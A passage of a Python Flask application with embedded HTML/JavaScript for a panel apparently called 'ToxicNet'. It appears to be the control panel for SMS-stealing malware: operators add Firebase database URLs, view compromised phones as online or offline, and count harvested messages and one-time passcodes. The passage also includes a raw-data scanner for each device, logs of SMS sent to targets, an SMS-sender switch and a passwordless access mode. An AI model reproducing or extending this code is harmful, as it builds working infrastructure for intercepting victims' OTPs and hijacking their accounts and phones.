let firebases = [];
let selected = new Set();
let autoKicked = false;
let currentTab = 'dash';
const $ = id => document.getElementById(id);
function toast(text){ const t=$('toast'); t.textContent=text; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'),2500); }
function escapeHtml(s){ return String(s==null?'':s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }

function adminSwitch(tab){
  currentTab = tab;
  ['dash','fb','logs','sec'].forEach(t=>{ $('aview-'+t).classList.add('hidden'); $('atab-'+t).classList.remove('active'); });
  $('aview-'+tab).classList.remove('hidden');
  $('atab-'+tab).classList.add('active');
  if(tab==='dash') loadAdminNumbers();
  if(tab==='fb') loadFirebases();
  if(tab==='logs') loadLogs();
  if(tab==='sec') loadPanelState();
}

async function checkConn(){
  try{
    const r = await fetch('/api/conn'); const d = await r.json();
    const badge = $('conn-badge'); const txt = $('conn-text');
    if(d.mongo_connected){ badge.className='conn online'; txt.textContent='Live'; }
    else { badge.className='conn'; txt.textContent='Off'; }
  }catch(e){}
}

async function loadAdminNumbers(){
  try{
    const r = await fetch('/api/numbers'); const d = await r.json();
    if(!d.success) return;
    allNumbers = d.numbers || [];
    if(allNumbers.length===0 && d.firebases_total>0 && !autoKicked){
      autoKicked = true;
      toast('🔄 First load — fetching...');
      fetch('/api/refresh',{method:'POST'}).finally(()=>{
        setTimeout(()=>{ autoKicked=false; loadAdminNumbers(); }, 1000);
      });
      return;
    }
    const total = allNumbers.length;
    const online = allNumbers.filter(n=>n.online).length;
    const offline = total - online;
    const totalOtp = allNumbers.reduce((s,n)=>s+n.otp_count,0);
    const totalMsg = allNumbers.reduce((s,n)=>s+n.msg_count,0);
    const otpRate = totalMsg>0 ? Math.floor((totalOtp/totalMsg)*100) : 0;

    $('a-s-total').textContent = total;
    $('a-s-online').textContent = online;
    $('a-s-offline').textContent = offline;
    $('a-s-otp').textContent = otpRate + '%';
    $('a-otp-circle').setAttribute('stroke-dasharray', otpRate + ', 100');
    $('a-num-count').textContent = total;
    $('q-fb').textContent = d.firebases_total || 0;

    $('a-num-list').innerHTML = allNumbers.map((n,i)=>{
      const isOnline = n.online===true;
      const isUnknown = (n.number||'').startsWith('UNKNOWN-');
      const iconCls = isUnknown?'unknown-icon':(isOnline?'':'offline-icon');
      const badgeCls = isOnline?'online':'offline';
      const iconEmoji = isUnknown?'❓':(isOnline?'📱':'📴');
      return '<div class="num-card">'
        + '<div class="num-icon '+iconCls+'">'+iconEmoji+'</div>'
        + '<div class="num-info" onclick="openInbox('+i+')">'
        + '<div class="num-title '+(isUnknown?'unknown':'')+'">'+escapeHtml(n.number)+'</div>'
        + '<div class="num-sub">'
        + '<span class="pill">✉️ '+n.msg_count+'</span>'
        + (n.otp_count>0?'<span class="pill otp">🔑 '+n.otp_count+'</span>':'')
        + '</div></div>'
        + '<div class="card-actions">'
        + '<button class="icon-btn" onclick="event.stopPropagation();openRaw('+i+')" style="background:#8b5cf6" title="Raw">🔍</button>'
        + '<button class="icon-btn send-btn" onclick="event.stopPropagation();quickSend(\''+escapeHtml(n.number)+'\')" title="Send">💬</button>'
        + '</div>'
        + '<div class="badge '+badgeCls+'"><span class="dot"></span>'+(isOnline?'Online':'Offline')+'</div>'
        + '</div>';
    }).join('');
  }catch(e){}
}

function openInbox(idx){ window.location.href = '/supermasteradmin/dashboard?open='+idx; }
function openRaw(idx){ const n = allNumbers[idx]; if(!n) return; window.open('/supermasteradmin/debug?fb='+encodeURIComponent(n.firebase)+'&id='+encodeURIComponent(n.device_id),'_blank'); }
function quickSend(num){ toast('💬 Open user panel to send to '+num); }

function manualRefresh(){
  toast('🔄 Refreshing...');
  fetch('/api/refresh',{method:'POST'}).then(r=>r.json()).then(d=>{
    if(d.success){ setTimeout(()=>{ if(currentTab==='dash') loadAdminNumbers(); if(currentTab==='fb') loadFirebases(); }, 500); toast('✅ Refreshed'); }
    else toast('❌ Failed');
  }).catch(()=>toast('❌ Network error'));
}

function toggleBulk(){ $('bulk-area').classList.toggle('hidden'); }

async function loadFirebases(){
  try{
    const r = await fetch('/api/firebases'); const d = await r.json();
    if(!d.success){ toast('❌ '+(d.error||'Error')); return; }
    firebases = d.firebases || [];
    $('fb-count').textContent = firebases.length;
    renderFirebases();
  }catch(e){}
}

function renderFirebases(){
  const box = $('fb-list');
  if(firebases.length===0){ box.innerHTML = '<div class="empty">📭 No firebases yet</div>'; return; }
  box.innerHTML = firebases.map(f=>{
    const isSel = selected.has(f.id);
    const badge = f.source==='personal_otp'?'<span style="font-size:10px;background:rgba(139,92,246,.15);color:#8b5cf6;padding:2px 6px;border-radius:4px;font-weight:700">USER</span>':'<span style="font-size:10px;background:rgba(239,68,68,.15);color:#ef4444;padding:2px 6px;border-radius:4px;font-weight:700">ROOT</span>';
    const stats = f.stats || {online:0,offline:0,devices:0};
    return '<div class="fb-card">'
      + '<div class="checkbox '+(isSel?'checked':'')+'" onclick="event.stopPropagation();toggleSel(\''+f.id+'\')">'+(isSel?'✓':'')+'</div>'
      + '<div class="fb-icon">🔥</div>'
      + '<div class="fb-info" onclick="openFbView(\''+f.id+'\')">'
      + '<div class="fb-name">'+escapeHtml(f.name||'unnamed')+' '+badge+'</div>'
      + '<div class="fb-hash">🔒 ID: '+escapeHtml(f.hash||'hidden')+'</div>'
      + '<div class="fb-counts">'
      + '<span class="pill on">🟢 '+stats.online+'</span>'
      + '<span class="pill off">🔴 '+stats.offline+'</span>'
      + '<span class="pill dev">📱 '+stats.devices+'</span>'
      + '</div></div>'
      + '<button class="btn gray" onclick="event.stopPropagation();removeOne(\''+f.id+'\')" style="padding:10px;border-radius:10px;width:auto">🗑</button>'
      + '</div>';
  }).join('');
}

function openFbView(id){ window.open('/supermasteradmin/firebase/'+id, '_blank'); }
function toggleSel(id){ if(selected.has(id)) selected.delete(id); else selected.add(id); renderFirebases(); }

async function addFirebase(){
  const url = $('fb-url').value.trim();
  if(!url){ $('fb-msg').textContent='❌ URL required'; $('fb-msg').style.color='#ef4444'; return; }
  try{
    const r = await fetch('/api/firebases',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url})});
    const d = await r.json();
    if(d.success){ $('fb-msg').textContent='✅ Added'; $('fb-msg').style.color='#10b981'; $('fb-url').value=''; loadFirebases(); }
    else { $('fb-msg').textContent='❌ '+(d.error||'Error'); $('fb-msg').style.color='#ef4444'; }
  }catch(e){ $('fb-msg').textContent='❌ Network error'; $('fb-msg').style.color='#ef4444'; }
}

async function bulkAdd(){
  const txt = $('fb-bulk').value.trim();
  if(!txt){ toast('❌ Empty'); return; }
  const urls = txt.split('\\n').map(l=>l.trim()).filter(l=>l.startsWith('http'));
  if(!urls.length){ toast('❌ No valid URLs'); return; }
  toast('⏳ Adding '+urls.length+'...');
  try{
    const r = await fetch('/api/firebases/bulk',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({urls})});
    const d = await r.json();
    if(d.success){ toast('✅ Added: '+d.added+', Skip: '+d.skipped); $('fb-bulk').value=''; $('bulk-area').classList.add('hidden'); loadFirebases(); }
    else toast('❌ '+(d.error||'Error'));
  }catch(e){ toast('❌ Network error'); }
}

async function removeOne(id){
  if(!confirm('Delete this firebase?')) return;
  try{
    const r = await fetch('/api/firebases/'+id,{method:'DELETE'}); const d = await r.json();
    if(d.success){ toast('✅ Deleted'); selected.delete(id); loadFirebases(); }
    else toast('❌ '+(d.error||'Error'));
  }catch(e){ toast('❌ Network error'); }
}

async function removeSelected(){
  if(selected.size===0){ toast('❌ Select at least one'); return; }
  if(!confirm('Delete '+selected.size+' firebase(s)?')) return;
  const ids = Array.from(selected);
  try{
    const r = await fetch('/api/firebases/bulk-delete',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ids})});
    const d = await r.json();
    if(d.success){ toast('✅ Deleted: '+d.deleted); selected.clear(); loadFirebases(); }
    else toast('❌ '+(d.error||'Error'));
  }catch(e){ toast('❌ Network error'); }
}

async function removeAll(){
  if(firebases.length===0){ toast('❌ No firebases'); return; }
  if(!confirm('Delete ALL '+firebases.length+' firebases?')) return;
  try{
    const r = await fetch('/api/firebases/all',{method:'DELETE'}); const d = await r.json();
    if(d.success){ toast('✅ Deleted all: '+d.deleted); selected.clear(); loadFirebases(); }
    else toast('❌ '+(d.error||'Error'));
  }catch(e){ toast('❌ Network error'); }
}

async function loadLogs(){
  try{
    const r = await fetch('/api/logs'); const d = await r.json();
    if(!d.success){ $('logs-container').innerHTML = '<div class="empty">❌ '+(d.error||'Error')+'</div>'; return; }
    const logs = d.logs || [];
    $('log-count').textContent = logs.length;
    if(logs.length===0){ $('logs-container').innerHTML = '<div class="empty">📭 No SMS logs yet</div>'; return; }
    $('logs-container').innerHTML = logs.map(l=>{
      const time = new Date((l.timestamp||0)*1000).toLocaleString('en-IN',{timeZone:'Asia/Kolkata',hour12:true,day:'2-digit',month:'short',hour:'2-digit',minute:'2-digit'});
      return '<div class="log-card">'
        + '<div class="log-head"><div class="log-target">📞 '+escapeHtml(l.target||'-')+'</div><div class="log-time">'+time+'</div></div>'
        + '<div class="log-msg">'+escapeHtml(l.message||'')+'</div>'
        + '<div class="log-meta">'
        + '<span>👤 '+(l.device_id||'-').slice(0,12)+'</span>'
        + '<span>🔢 '+l.count+'x</span>'
        + '<span>✅ '+(l.success||0)+'</span>'
        + '<span>🌐 '+(l.ip||'-')+'</span>'
        + '</div></div>';
    }).join('');
  }catch(e){ $('logs-container').innerHTML = '<div class="empty">❌ Network error</div>'; }
}

async function loadPanelState(){
  try{
    const r = await fetch('/api/panel/state'); const d = await r.json();
    updatePanelDisplay(d.state);
  }catch(e){}
}

function updatePanelDisplay(state){
  const display = $('panel-status-display');
  const val = $('panel-status-val');
  if(state==='active'){
    display.className = 'status-display active';
    display.querySelector('.status-icon').textContent = '🟢';
    val.textContent = 'ACTIVE';
  } else if(state==='inactive'){
    display.className = 'status-display inactive';
    display.querySelector('.status-icon').textContent = '🔴';
    val.textContent = 'DEACTIVATED';
  } else if(state==='pwdless'){
    display.className = 'status-display pwdless';
    display.querySelector('.status-icon').textContent = '🔓';
    val.textContent = 'PASSWORDLESS';
  }
}

async function setPanelState(state){
  try{
    const r = await fetch('/api/panel/set',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({state})});
    const d = await r.json();
    if(d.success){ updatePanelDisplay(state); toast('✅ Panel: '+state); }
    else toast('❌ '+(d.error||'Error'));
  }catch(e){ toast('❌ Network error'); }
}

async function setSmsToggle(enabled){
  try{
    const r = await fetch('/api/sms/toggle',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({enabled})});
    const d = await r.json();
    if(d.success) toast(enabled?'🟢 SMS Sender ON':'🔴 SMS Sender OFF');
    else toast('❌ '+(d.error||'Error'));
  }catch(e){ toast('❌ Network error'); }
}

function tp(id, e){
  const i = $(id);
  const t = e.target;
  if(i.type==='password'){ i.type='text'; t.textContent='🙈'; }
  else { i.type='password'; t.textContent='👁'; }
}

async function changePwd(role){
  const pwd = $(role+'-pwd').value.trim();
  if(!pwd || pwd.length<4){ toast('❌ Min 4 chars'); return; }
  try{
    const r = await fetch('/api/security/change',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({role, password:pwd})});
    const d = await r.json();
    if(d.success){ toast('✅ '+role+' password changed'); $(role+'-pwd').value=''; }
    else toast('❌ '+(d.error||'Error'));
  }catch(e){ toast('❌ Network error'); }
}

checkConn();
loadAdminNumbers();
setInterval(checkConn, 10000);
setInterval(()=>{ if(currentTab==='dash') loadAdminNumbers(); }, 5000);
</script>
</body></html>
"""


# ════════════════════════════════════════════════════════════
# PERSONAL OTP
# ════════════════════════════════════════════════════════════
PERSONAL_OTP_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Personal OTP</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<style>""" + DARK_CSS + """</style></head><body class="app">

<div class="topbar">
<div class="brand">Personal<span style="color:#10b981">OTP</span></div>
<div class="top-actions">
<button class="refresh-btn" onclick="loadNumbers()">⟳</button>
<div class="conn online"><span class="dot"></span><span>Live</span></div>
</div>
</div>

<div class="nav">
<a href="/" class="nav-link">📱 Numbers</a>
<a href="/otp" class="nav-link active">🔑 Personal OTP</a>
</div>

<div class="container">
<div class="fb-card-list">
<h3 style="font-size:16px;font-weight:700;margin-bottom:16px">➕ Add Your Firebase URL</h3>
<div class="add-row">
<input id="fb-url" placeholder="https://xxx-default-rtdb.firebaseio.com" type="url">
<button class="btn primary" onclick="addFirebase()" style="max-width:100px">Add</button>
<button class="btn gray" onclick="toggleBulk()" style="max-width:100px">Bulk</button>
</div>
<div id="bulk-area" class="hidden" style="margin-top:12px">
<textarea id="fb-bulk" placeholder="Ek line me ek URL paste karo" style="width:100%;padding:14px;border-radius:12px;border:1px solid #334155;background:#0f172a;color:#f1f5f9;font-family:monospace;min-height:120px"></textarea>
<button class="btn primary" onclick="bulkAdd()" style="margin-top:8px;max-width:160px">📥 Import</button>
</div>
<div id="add-msg" style="margin-top:10px;font-size:13px;font-weight:600"></div>
<div id="my-fb-list" style="margin-top:14px"></div>
</div>

<div class="stats">
<div class="stat total"><div class="label">Total</div><div class="value" id="s-total">0</div></div>
<div class="stat online"><div class="label">Online</div><div class="value" id="s-online">0</div></div>
<div class="stat offline"><div class="label">Offline</div><div class="value" id="s-offline">0</div></div>
<div class="stat otp">
<div class="label" style="margin-bottom:2px">OTP Rate</div>
<svg viewBox="0 0 36 36" class="circular-chart">
<path class="circle-bg" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"/>
<path class="circle" id="otp-circle" stroke-dasharray="0, 100" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"/>
<text x="18" y="18" class="otp-text" id="s-otp">0%</text>
</svg>
</div>
</div>

<div class="filter-bar">
<button class="filter-btn active" id="filter-all" onclick="setFilter('all')">All</button>
<button class="filter-btn online-filter" id="filter-online" onclick="setFilter('online')">🟢 Online</button>
<button class="filter-btn offline-filter" id="filter-offline" onclick="setFilter('offline')">🔴 Offline</button>
</div>

<div class="search-box"><input id="search-num" placeholder="Search number..." oninput="renderNumbers()"></div>

<div id="loading-text" class="empty"><span class="spinner"></span> Loading...</div>
<div id="list-content" class="hidden">
<div class="list-header"><h2>Numbers</h2><span class="count" id="num-count">0</span></div>
<div id="num-list"></div>
</div>
</div>

<div id="toast" class="toast"></div>

<script>
const COOKIE_NAME = "toxicnet_personal_fb_v1";
let myFirebases = [];
let allNumbers = [];
let numbers = [];
let currentFilter = 'all';
const $ = id => document.getElementById(id);
function toast(t){ const el=$('toast'); el.textContent=t; el.classList.add('show'); setTimeout(()=>el.classList.remove('show'),2500); }
function escapeHtml(s){ return String(s==null?'':s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }

function getCookie(n){ const cs=document.cookie.split(';'); for(let c of cs){ c=c.trim(); if(c.indexOf(n+'=')===0){ try{ return JSON.parse(decodeURIComponent(c.substring(n.length+1))); }catch(e){ return []; } } } return []; }
function setCookie(n,v,d){ const e=new Date(Date.now()+d*864e5).toUTCString(); document.cookie=n+'='+encodeURIComponent(JSON.stringify(v))+'; expires='+e+'; path=/; SameSite=Lax'; }
function saveMyFb(){ setCookie(COOKIE_NAME, myFirebases, 365); }

function toggleBulk(){ $('bulk-area').classList.toggle('hidden'); }

function renderMyFirebases(){
  const box = $('my-fb-list');
  if(myFirebases.length===0){ box.innerHTML=''; return; }
  box.innerHTML = myFirebases.map((fb,i)=>
    '<div class="fb-card">'
    + '<div class="fb-icon">🔥</div>'
    + '<div class="fb-info"><div class="fb-name">Firebase #'+(i+1)+'</div>'
    + '<div class="fb-hash">ID: '+escapeHtml(fb.hash||'hidden')+'</div></div>'
    + '<button class="btn gray" onclick="removeFb('+i+')" style="padding:10px;border-radius:10px;width:auto">🗑</button>'
    + '</div>'
  ).join('');
}

async function addFirebase(){
  let url = $('fb-url').value.trim();
  if(!url){ $('add-msg').textContent='❌ URL required'; $('add-msg').style.color='#ef4444'; return; }
  if(!url.startsWith('http')) url='https://'+url;
  url = url.replace(/\/+$/,'');
  if(!url.includes('firebase')){ $('add-msg').textContent='❌ Invalid firebase URL'; $('add-msg').style.color='#ef4444'; return; }
  if(myFirebases.some(f=>f.url===url)){ $('add-msg').textContent='⚠️ Already added'; $('add-msg').style.color='#f59e0b'; return; }
  try{
    const r = await fetch('/api/otp/add',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url})});
    const d = await r.json();
    if(d.success){
      myFirebases.push({url, hash:d.hash||'hidden'});
      saveMyFb(); renderMyFirebases(); loadNumbers();
      $('add-msg').textContent='✅ Added'; $('add-msg').style.color='#10b981'; $('fb-url').value='';
    } else { $('add-msg').textContent='❌ '+(d.error||'Error'); $('add-msg').style.color='#ef4444'; }
  }catch(e){ $('add-msg').textContent='❌ Network error'; $('add-msg').style.color='#ef4444'; }
}

async function bulkAdd(){
  const txt = $('fb-bulk').value.trim();
  if(!txt){ toast('❌ Empty'); return; }
  const urls = txt.split('\\n').map(l=>l.trim()).filter(l=>l.includes('firebase'));
  if(!urls.length){ toast('❌ No valid URLs'); return; }
  let added=0, skipped=0;
  for(let i=0;i<urls.length;i++){
    let url = urls[i]; if(!url.startsWith('http')) url='https://'+url;
    url = url.replace(/\/+$/,'');
    if(myFirebases.some(f=>f.url===url)){ skipped++; continue; }
    try{
      const r = await fetch('/api/otp/add',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url})});
      const d = await r.json();
      if(d.success){ myFirebases.push({url, hash:d.hash||'hidden'}); added++; }
    }catch(e){}
  }
  saveMyFb(); renderMyFirebases(); $('fb-bulk').value=''; $('bulk-area').classList.add('hidden');
  toast('✅ Added: '+added+', Skip: '+skipped);
  loadNumbers();
}

function removeFb(i){ myFirebases.splice(i,1); saveMyFb(); renderMyFirebases(); loadNumbers(); }

function setFilter(f){ currentFilter=f; ['all','online','offline'].forEach(x=>$('filter-'+x).classList.remove('active')); $('filter-'+f).classList.add('active'); renderNumbers(); }

async function loadNumbers(){
  if(myFirebases.length===0){
    $('list-content').classList.add('hidden');
    $('loading-text').classList.remove('hidden');
    $('loading-text').textContent='Add a firebase to start...';
    return;
  }
  $('loading-text').classList.remove('hidden');
  $('loading-text').innerHTML='<span class="spinner"></span> Loading...';
  try{
    const r = await fetch('/api/otp/data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({urls:myFirebases.map(f=>f.url)})});
    const d = await r.json();
    if(!d.success){ $('loading-text').textContent='❌ '+(d.error||'Error'); return; }
    allNumbers = d.numbers||[];
    $('s-total').textContent = d.total||0;
    $('s-online').textContent = d.online||0;
    $('s-offline').textContent = d.offline||0;
    $('s-otp').textContent = (d.otp_rate||0)+'%';
    $('otp-circle').setAttribute('stroke-dasharray',(d.otp_rate||0)+', 100');
    $('loading-text').classList.add('hidden');
    $('list-content').classList.remove('hidden');
    renderNumbers();
  }catch(e){ $('loading-text').textContent='❌ Network error'; }
}

function renderNumbers(){
  const q = ($('search-num').value||'').toLowerCase();
  let filtered = allNumbers;
  if(currentFilter==='online') filtered = filtered.filter(n=>n.online===true);
  if(currentFilter==='offline') filtered = filtered.filter(n=>n.online!==true);
  if(q) filtered = filtered.filter(n=>(n.number||'').toLowerCase().includes(q));
  numbers = filtered;
  $('num-count').textContent = filtered.length;
  if(!filtered.length){ $('num-list').innerHTML='<div class="empty">No numbers</div>'; return; }
  $('num-list').innerHTML = filtered.map((n,i)=>{
    const isOnline = n.online===true;
    const isUnknown = (n.number||'').startsWith('UNKNOWN-');
    const iconCls = isUnknown?'unknown-icon':(isOnline?'':'offline-icon');
    const iconEmoji = isUnknown?'❓':(isOnline?'📱':'📴');
    return '<div class="num-card">'
      + '<div class="num-icon '+iconCls+'">'+iconEmoji+'</div>'
      + '<div class="num-info"><div class="num-title '+(isUnknown?'unknown':'')+'">'+escapeHtml(n.number)+'</div>'
      + '<div class="num-sub"><span class="pill">✉️ '+n.msg_count+'</span>'
      + (n.otp_count>0?'<span class="pill otp">🔑 '+n.otp_count+'</span>':'')
      + '</div></div>'
      + '<div class="badge '+(isOnline?'online':'offline')+'"><span class="dot"></span>'+(isOnline?'Online':'Offline')+'</div>'
      + '</div>';
  }).join('');
}

try{ const raw=getCookie(COOKIE_NAME)||[]; if(Array.isArray(raw)) myFirebases=raw; }catch(e){ myFirebases=[]; }
renderMyFirebases();
if(myFirebases.length>0) loadNumbers();
setInterval(()=>{ if(myFirebases.length>0) loadNumbers(); }, 10000);
</script>
</body></html>
"""


# ════════════════════════════════════════════════════════════
# FIREBASE VIEW
# ════════════════════════════════════════════════════════════
FIREBASE_VIEW_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Firebase — ToxicNet</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<style>""" + DARK_CSS + """</style></head><body class="app">

<div class="topbar">
<div class="brand">☣️ Fire<span>base</span></div>
<a href="/supermasteradmin/firebases" class="nav-link">← Back</a>
</div>

<div class="container">
<div class="sec-card">
<h1 style="font-size:18px;font-weight:800;margin-bottom:6px">🔥 <span id="fb-name">Loading...</span></h1>
<div style="font-size:11px;color:#94a3b8;margin-bottom:14px;font-family:monospace">🔒 ID: <span id="fb-hash">-</span></div>
<div class="stats">
<div class="stat total"><div class="label">Devices</div><div class="value" id="h-dev">0</div></div>
<div class="stat online"><div class="label">Online</div><div class="value" id="h-on">0</div></div>
<div class="stat offline"><div class="label">Offline</div><div class="value" id="h-off">0</div></div>
<div class="stat otp"><div class="label">OTPs</div><div class="value" id="h-otp">0</div></div>
</div>
</div>
<div class="list-header"><h2>Numbers</h2><span class="count" id="num-count">0</span></div>
<div id="num-list"></div>
</div>

<div id="toast" class="toast"></div>

<script>
const FB_ID = "{{FB_ID}}";
let numbers = [];
const $ = id => document.getElementById(id);
function toast(t){ const el=$('toast'); el.textContent=t; el.classList.add('show'); setTimeout(()=>el.classList.remove('show'),2000); }
function escapeHtml(s){ return String(s==null?'':s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }

async function loadFirebase(){
  try{
    const r = await fetch('/api/firebase/'+FB_ID); const d = await r.json();
    if(!d.success){ $('num-list').innerHTML='<div class="empty">❌ '+(d.error||'Error')+'</div>'; return; }
    $('fb-name').textContent = d.name||'unnamed';
    $('fb-hash').textContent = d.hash||'-';
    $('h-dev').textContent = d.device_count;
    $('h-on').textContent = d.online_count;
    $('h-off').textContent = d.offline_count;
    $('h-otp').textContent = d.otp_count;
    numbers = d.numbers||[];
    $('num-count').textContent = numbers.length;
    renderNumbers();
  }catch(e){}
}

function renderNumbers(){
  if(!numbers.length){ $('num-list').innerHTML='<div class="empty">📭 No numbers</div>'; return; }
  $('num-list').innerHTML = numbers.map(n=>{
    const isOnline = n.online===true;
    const isUnknown = (n.number||'').startsWith('UNKNOWN-');
    const iconCls = isUnknown?'unknown-icon':(isOnline?'':'offline-icon');
    const iconEmoji = isUnknown?'❓':(isOnline?'📱':'📴');
    return '<div class="num-card">'
      + '<div class="num-icon '+iconCls+'">'+iconEmoji+'</div>'
      + '<div class="num-info">'
      + '<div class="num-title '+(isUnknown?'unknown':'')+'">'+escapeHtml(n.number)+'</div>'
      + '<div class="num-sub"><span class="pill">✉️ '+n.msg_count+'</span>'
      + (n.otp_count>0?'<span class="pill otp">🔑 '+n.otp_count+'</span>':'')
      + '</div></div>'
      + '<div class="badge '+(isOnline?'online':'offline')+'"><span class="dot"></span>'+(isOnline?'Online':'Offline')+'</div>'
      + '</div>';
  }).join('');
}

loadFirebase();
</script>
</body></html>
"""


# ════════════════════════════════════════════════════════════
# DEBUG
# ════════════════════════════════════════════════════════════
DEBUG_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Raw Data</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<style>""" + DARK_CSS + """
.data{background:#0f172a;border:1px solid #1e293b;border-radius:8px;padding:10px;color:#cbd5e1;font-family:monospace;font-size:10px;white-space:pre-wrap;word-break:break-word;max-height:400px;overflow-y:auto}
.path{color:#fbbf24;font-weight:700;margin-bottom:6px;font-family:monospace;word-break:break-all}
.status-ok{color:#4ade80;font-weight:600;margin-bottom:6px}
.status-empty{color:#f87171;font-weight:600;margin-bottom:6px}
</style></head><body class="app">
<div class="container">
<a href="/supermasteradmin/firebases" class="nav-link">← Back</a>
<h1 style="font-size:18px;font-weight:800;margin:14px 0">🔍 Raw Data Explorer</h1>
<div style="font-size:12px;color:#94a3b8;margin-bottom:14px;word-break:break-all" id="sub">Loading...</div>
<div id="summary" class="sec-card" style="display:none">Scanning...</div>
<div id="results"></div>
</div>
<script>
const p = new URLSearchParams(window.location.search);
const FB = p.get('fb'); const DEV = p.get('id');
document.getElementById('sub').textContent = 'Device: '+DEV;
function escapeHtml(s){ return String(s==null?'':s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
async function scan(){
  const results = document.getElementById('results');
  results.innerHTML = '<div class="sec-card"><span class="spinner"></span> Scanning...</div>';
  try{
    const r = await fetch('/api/rawdata?fb='+encodeURIComponent(FB)+'&id='+encodeURIComponent(DEV));
    const d = await r.json();
    if(!d.success){ results.innerHTML='<div class="sec-card">❌ '+(d.error||'Error')+'</div>'; return; }
    document.getElementById('summary').style.display='block';
    document.getElementById('summary').innerHTML = '🔎 <b>'+d.scanned+'</b> paths scanned — <b>'+d.found+'</b> with data';
    results.innerHTML = d.results.map(item=>{
      const cls = item.status==='has_data'?'status-ok':'status-empty';
      const statusTxt = item.status==='has_data'?'✅ HAS DATA'+(item.message_count?' — '+item.message_count+' msgs':''):'⚪ Empty';
      const dataTxt = item.data ? JSON.stringify(item.data, null, 2).slice(0,3000) : '';
      return '<div class="sec-card"><div class="path">'+item.path+'</div><div class="'+cls+'">'+statusTxt+'</div>'
        + (dataTxt?'<div class="data">'+escapeHtml(dataTxt)+'</div>':'')
        + '</div>';
    }).join('');
  }catch(e){ results.innerHTML='<div class="sec-card">❌ Network error</div>'; }
}
scan();
</script>
</body></html>
"""


# ════════════════════════════════════════════════════════════
# ROUTES (UPDATED WITH SUPERMASTERADMIN)
# ════════════════════════════════════════════════════════════
@app.route("/login", methods=["GET", "POST"])
def login_page():
    if session.get("logged_in") and session.get("role") == "user":
        return redirect(url_for("user_dashboard"))
    state = get_panel_state()
    if state == "pwdless":
        session["logged_in"] = True
        session["role"] = "user"
        return redirect(url_for("user_dashboard"))
    error = ""
    if request.method == "POST":
        pwd = request.form.get("password", "")
        if pwd == get_pwd("user"):
            session["logged_in"] = True
            session["role"] = "user"
            return redirect(url_for("user_dashboard"))
        error = '<div class="err">❌ Wrong password!</div>'
    if state == "inactive":
        error = '<div class="err">⚠️ Panel temporarily disabled</div>'
    return Response(LOGIN_HTML.replace("__ERROR__", error), mimetype="text/html")


@app.route("/supermasteradmin", methods=["GET", "POST"])
def admin_login_page():
    if session.get("logged_in") and session.get("role") == "admin":
        return redirect(url_for("admin_dashboard"))
    error = ""
    if request.method == "POST":
        pwd = request.form.get("password", "")
        if pwd == get_pwd("admin"):
            session["logged_in"] = True
            session["role"] = "admin"
            return redirect(url_for("admin_dashboard"))
        error = '<div class="err">❌ Wrong admin password!</div>'
    return Response(ADMIN_LOGIN_HTML.replace("__ERROR__", error), mimetype="text/html")


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login_page"))


@app.route("/")
@login_required
def user_dashboard():
    return Response(USER_DASHBOARD_HTML, mimetype="text/html")


@app.route("/otp")
@login_required
def personal_otp():
    return Response(PERSONAL_OTP_HTML, mimetype="text/html")


@app.route("/supermasteradmin/dashboard")
@admin_required
def admin_dashboard():
    return Response(ADMIN_DASHBOARD_HTML, mimetype="text/html")


@app.route("/supermasteradmin/security")
@admin_required
def admin_security():
    return redirect("/supermasteradmin/dashboard#sec")


@app.route("/supermasteradmin/firebases")
@admin_required
def firebases_page():
    return redirect("/supermasteradmin/dashboard#fb")


@app.route("/supermasteradmin/firebase/<fb_id>")
@admin_required
def firebase_view_page(fb_id):
    return Response(FIREBASE_VIEW_HTML.replace("{{FB_ID}}", fb_id), mimetype="text/html")


@app.route("/supermasteradmin/debug")
@admin_required
def debug_page():
    return Response(DEBUG_HTML, mimetype="text/html")


# ─────────────────────────────────────────────────────────────
# API
# ─────────────────────────────────────────────────────────────
@app.route("/api/conn")
def api_conn():
    return jsonify({"success": True, "mongo_connected": MONGO_OK})


@app.route("/api/panel/state")
def api_panel_state():
    return jsonify({
        "success": True,
        "state": get_panel_state(),
        "sms_enabled": get_sms_sender_enabled(),
    })


@app.route("/api/panel/set", methods=["POST"])
@admin_required
def api_panel_set():
    data = request.get_json() or {}
    state = data.get("state", "").strip()
    if state not in ("active", "inactive", "pwdless"):
        return jsonify({"success": False, "error": "Invalid state"}), 400
    if set_setting("panel_state", state):
        return jsonify({"success": True, "state": state})
    return jsonify({"success": False, "error": "Failed to save"}), 500


@app.route("/api/sms/toggle", methods=["POST"])
@admin_required
def api_sms_toggle():
    data = request.get_json() or {}
    enabled = bool(data.get("enabled", True))
    if set_setting("sms_sender_enabled", enabled):
        return jsonify({"success": True, "enabled": enabled})
